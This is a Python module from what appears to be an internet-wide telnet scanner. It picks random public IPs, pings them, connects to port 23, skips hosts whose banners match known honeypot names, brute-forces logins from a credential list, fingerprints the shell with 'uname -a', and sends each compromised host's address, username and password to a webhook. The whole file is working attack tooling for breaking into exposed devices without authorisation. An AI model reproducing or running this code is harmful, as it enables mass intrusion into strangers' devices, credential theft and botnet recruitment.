"""Per-target pipeline: gen ip → icmp → :23 probe → honeypot check → bruteforce → report."""

import asyncio
import random
import time
from dataclasses import dataclass, field
from typing import Optional

from core.session import (
    TelnetSession, strip_iac, PROMPT_RE, PASSWORD_RE, SHELL_RE, FAIL_RE,
)
from core.webhook import post_hit
from data.creds import CREDS


RESERVED = [
    "0.", "10.", "100.64.", "127.", "169.254.", "172.16.", "172.17.", "172.18.",
    "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
    "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.0.0.",
    "192.0.2.", "192.168.", "198.18.", "198.19.", "198.51.100.", "203.0.113.",
    "224.", "225.", "226.", "227.", "228.", "229.", "230.", "231.", "232.",
    "233.", "234.", "235.", "236.", "237.", "238.", "239.", "240.", "241.",
    "242.", "243.", "244.", "245.", "246.", "247.", "248.", "249.", "250.",
    "251.", "252.", "253.", "254.", "255.",
]

HONEYPOT_SIGS = [
    "cowrie", "dionaea", "kippo", "honeypot", "glastopf",
    "amun", "nepenthes", "heralding", "telnet-iot-honeypot", "honey",
]


def random_ip() -> str:
    while True:
        ip = (f"{random.randint(1,223)}.{random.randint(0,255)}."
              f"{random.randint(0,255)}.{random.randint(1,254)}")
        if not any(ip.startswith(p) for p in RESERVED):
            return ip


async def icmp_alive(ip: str, timeout: float = 0.8) -> bool:
    try:
        proc = await asyncio.create_subprocess_exec(
            "ping", "-c", "1", "-W", str(int(timeout)), ip,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        try:
            await asyncio.wait_for(proc.wait(), timeout=timeout + 0.5)
        except asyncio.TimeoutError:
            proc.kill()
            return False
        return proc.returncode == 0
    except (FileNotFoundError, PermissionError):
        return True


def looks_like_honeypot(banner: str) -> bool:
    b = banner.lower()
    return any(sig in b for sig in HONEYPOT_SIGS)


@dataclass
class Hit:
    ip: str
    port: int
    banner: str
    user: str
    password: str
    post_auth_banner: str
    shell: str
    duration: float
    ts: float = field(default_factory=time.time)


async def try_creds(ip: str, banner: str, timeout: float = 8.0) -> Optional[Hit]:
    start = time.monotonic()
    for user, pwd in CREDS:
        sess = TelnetSession(ip, timeout=timeout)
        if not await sess.connect():
            return None
        try:
            await sess.drain(0.6)
            await sess.read_until(PROMPT_RE, wait=3.0)
            await sess.send(user.encode() + b"\n")
            await sess.read_until(PASSWORD_RE, wait=3.0)
            await sess.send(pwd.encode() + b"\n")
            resp = await sess.read_until(SHELL_RE, wait=4.0)
            clean = strip_iac(resp)

            if SHELL_RE.search(clean) and not FAIL_RE.search(clean):
                await sess.send(b"echo READY_$((1+1))\n")
                probe = strip_iac(await sess.read_until(b"READY_2", wait=3.0))
                shell = "generic"
                await sess.send(b"uname -a\n")
                u = strip_iac(await sess.drain(1.5))
                if b"Linux" in u:
                    shell = "linux"
                elif b"Cisco" in u:
                    shell = "cisco-ios"
                elif b"BusyBox" in u:
                    shell = "busybox"

                return Hit(
                    ip=ip, port=23, banner=banner,
                    user=user, password=pwd,
                    post_auth_banner=probe.decode("utf-8", "replace").strip(),
                    shell=shell,
                    duration=round(time.monotonic() - start, 2),
                )
        finally:
            await sess.close()
    return None


async def scan_target(ip: str, sem: asyncio.Semaphore, webhook: str, stats: dict):
    async with sem:
        stats["attempted"] += 1
        if not await icmp_alive(ip):
            return
        sess = TelnetSession(ip, timeout=4.0)
        if not await sess.connect():
            return
        stats["open_23"] += 1
        try:
            banner_bytes = await sess.drain(2.5)
        finally:
            await sess.close()

        banner = strip_iac(banner_bytes).decode("utf-8", "replace").strip()
        if not banner:
            return
        if looks_like_honeypot(banner):
            stats["honeypots"] += 1
            print(f"[-] honeypot? {ip} :: {banner[:60]!r}")
            return

        print(f"[+] telnet {ip} :: {banner[:60]!r}")
        hit = await try_creds(ip, banner)
        if not hit:
            return
        stats["hits"] += 1
        print(f"[!!] HIT {hit.ip} {hit.user}:{hit.password} shell={hit.shell}")
        await post_hit(webhook, hit)


async def run(webhook: str, workers: int):
    sem = asyncio.Semaphore(workers)
    stats = {"attempted": 0, "open_23": 0, "honeypots": 0, "hits": 0}
    tasks: set[asyncio.Task] = set()

    print(f"[*] {workers} workers. ctrl-c to stop.\n")
    try:
        while True:
            if len(tasks) < workers * 4:
                ip = random_ip()
                t = asyncio.create_task(scan_target(ip, sem, webhook, stats))
                tasks.add(t)
                t.add_done_callback(tasks.discard)
            else:
                await asyncio.sleep(0.05)
    except asyncio.CancelledError:
        pass
    finally:
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        print(f"\n[*] attempted={stats['attempted']} open={stats['open_23']} "
              f"honeypots={stats['honeypots']} hits={stats['hits']}")
